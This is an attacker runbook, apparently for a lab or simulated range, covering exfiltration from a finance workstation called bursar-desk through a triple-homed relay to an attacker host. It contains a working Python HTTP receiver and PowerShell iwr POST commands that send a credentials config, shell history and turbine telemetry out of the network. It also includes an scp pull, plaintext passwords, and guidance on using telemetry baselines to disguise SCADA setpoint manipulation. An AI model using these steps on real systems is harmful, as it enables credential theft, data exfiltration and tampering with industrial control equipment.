# Runbook: Exfiltration from bursar-desk

## Situation

bursar-desk holds two things worth getting off the machine:

- `AppData\Roaming\UUPLOps\ops-access.conf`: credentials for the historian
  (historian / Historian2015) and the SCADA console (admin / admin)
- `reports\turbine_2024-0*.csv`: three months of historian-pulled turbine telemetry,
  confirming which tags are live and what normal operating values look like

These are not just notes for the current session. Getting them to unseen-gate means the
attacker has authenticated access to both operational zone services, documented and usable
from the attack origin, regardless of whether the bursar-desk foothold survives.

## The exfil problem

bursar-desk has two NICs: 10.10.1.20 (enterprise) and 10.10.2.100 (operational). Neither
reaches the internet zone. unseen-gate is at 10.10.0.5, on a segment bursar-desk has no
route to. A direct POST to 10.10.0.5:9999 fails silently.

The relay is wizzards-retreat. It is triple-homed:

| Interface | Address     | Zone       |
|-----------|-------------|------------|
| eth1      | 10.10.0.10  | internet   |
| eth2      | 10.10.1.3   | enterprise |
| eth3      | 10.10.2.3   | operational|

It runs a real Linux shell (no facade). The attacker already holds an SSH session there
from the entry chain. It can receive from bursar-desk on one NIC and forward to unseen-gate
on another.

## Route options

Two paths from bursar-desk to wizzards-retreat:

**Path A: operational NIC**

| Step | From                        | To                         | Segment     |
|------|-----------------------------|----------------------------|-------------|
| 1    | bursar-desk (10.10.2.100)   | wizzards-retreat (10.10.2.3) | operational |
| 2    | wizzards-retreat (10.10.0.10) | unseen-gate (10.10.0.5)  | internet    |

bursar-desk and wizzards-retreat are on the same /24. Same segment, direct ARP reach, no
routing hop. If the bursar-desk foothold was gained by pivoting from an operational-zone
host, this is the natural path.

**Path B: enterprise NIC**

| Step | From                        | To                           | Segment    |
|------|-----------------------------|------------------------------|------------|
| 1    | bursar-desk (10.10.1.20)    | wizzards-retreat (10.10.1.3) | enterprise |
| 2    | wizzards-retreat (10.10.0.10) | unseen-gate (10.10.0.5)   | internet   |

One routing hop via ent-ops-fw. Viable if the attacker's existing SSH chain runs through
the enterprise path. Same two-step structure, different first-hop address.

Path A is used below. The only change for Path B is replacing 10.10.2.3 with 10.10.1.3 in
the listener and the `iwr` URI.

## Path A: exfil via operational NIC

### Step 1: start a receiver on wizzards-retreat

In the SSH session to wizzards-retreat, start a minimal HTTP server that saves POSTed
files to `/tmp/loot/`:

```bash
mkdir -p /tmp/loot
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        name = self.path.strip('/')
        open('/tmp/loot/' + name, 'wb').write(self.rfile.read(n))
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('10.10.2.3', 9999), R).serve_forever()
" &
```

The server binds to the operational NIC (10.10.2.3). It accepts each POST, names the file
from the URL path, and writes the body to `/tmp/loot/`. No authentication, no TLS: this
matches the threat model of an attacker who already owns the relay host.

### Step 2: POST files from bursar-desk

From the bursar-desk facade shell:

```powershell
iwr -Method POST -Uri http://10.10.2.3:9999/ops-access.conf -InFile AppData\Roaming\UUPLOps\ops-access.conf
iwr -Method POST -Uri http://10.10.2.3:9999/ConsoleHost_history.txt -InFile AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
iwr -Method POST -Uri http://10.10.2.3:9999/turbine_2024-01.csv -InFile reports\turbine_2024-01.csv
iwr -Method POST -Uri http://10.10.2.3:9999/turbine_2024-02.csv -InFile reports\turbine_2024-02.csv
iwr -Method POST -Uri http://10.10.2.3:9999/turbine_2024-03.csv -InFile reports\turbine_2024-03.csv
```

`iwr -Method POST -InFile` translates to `curl -X POST --data-binary @file` in the facade.
Each call exits 0. If a file path is wrong the POST body is empty; check sizes on receipt.

### Step 3: confirm receipt on wizzards-retreat

Back in the wizzards-retreat session:

```bash
kill %1
ls -lh /tmp/loot/
```

Expected:

```
ops-access.conf          ~200 bytes
ConsoleHost_history.txt  ~400 bytes
turbine_2024-01.csv      ~5 KB
turbine_2024-02.csv      ~5 KB
turbine_2024-03.csv      ~5 KB
```

A zero-byte file means the `iwr` path was wrong or the facade did not resolve it. Re-send
with the correct path.

### Step 4: pull to unseen-gate

Both machines are on the internet segment (10.10.0.x). From the unseen-gate terminal,
pull the loot over rincewind's SSH session:

```bash
mkdir -p ~/loot
scp 'rincewind@10.10.0.10:/tmp/loot/*' ~/loot/
```

Password: wizzard. wizzards-retreat allows password authentication; the credential is
already known from the entry chain.

If keeping the files at wizzards-retreat is sufficient for the session, skip this step.
The credential set is usable from wizzards-retreat directly via its operational NIC.

## What this enables

`ops-access.conf` carries credentials the attacker did not previously hold at the attack
origin:

- `historian / Historian2015`: authenticated read access to the historian `/report` endpoint.
  Querying it through wizzards-retreat (10.10.2.3 → 10.10.2.10) no longer requires bursar-desk
  to be alive.
- `admin / admin`: authenticated access to the distribution-SCADA console at 10.10.2.20:8080.
  Same path applies.

The turbine CSVs establish three months of baseline: normal RPM range, temperature, voltage,
and current. This baseline is what makes a manipulated historian reading look plausible, or
what tells the attacker which setpoint changes would stay inside normal operating bounds long
enough to avoid an immediate alarm.

PSReadLine history confirms the historian endpoint format and the Base64 credential string the
finance team was already using, which is useful as a cross-reference if the conf file is
later rotated or the attacker needs a fresh source to cite.